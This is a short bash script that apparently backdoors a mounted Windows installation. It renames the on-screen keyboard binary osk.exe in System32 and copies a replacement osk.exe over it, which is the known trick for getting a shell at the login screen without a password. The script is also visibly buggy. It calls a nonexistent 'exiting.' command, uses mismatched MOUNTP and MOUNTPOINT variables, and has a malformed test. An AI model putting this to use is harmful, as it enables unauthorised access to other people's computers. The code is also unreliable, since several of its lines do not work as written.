#!/bin/bash

MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
MKPATCH=1

usage()
{
    echo "$0 <path to where windows is mounted>"
    echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
}

if [[ $(whoami | grep root) ]]; then 
    : 
else 
    echo "Are we root? "
    exiting. 
fi 

if [[ $1 = "-h" ]]; then 
    usage 
    exit 
fi 

if [[ ! -n $1 ]]; then 
    MOUNTP=/dev/sda4
    exit 
fi 
 
if [[ $(ls $MOUNTPOINT/Windows/System32 | grep cmd.exe )]]; then 
    echo "System32 detected. Continuing."
else
    echo "System32 not found. Are you at the right directory?"
    exit 
fi 

# Logic parts
cd $MOUNTPOINT/Windows/System32 
sudo cp -fpr osk.exe lol.exe 
sudo cp -fpr $MYDIR/osk.exe . 

echo "Patching done !"
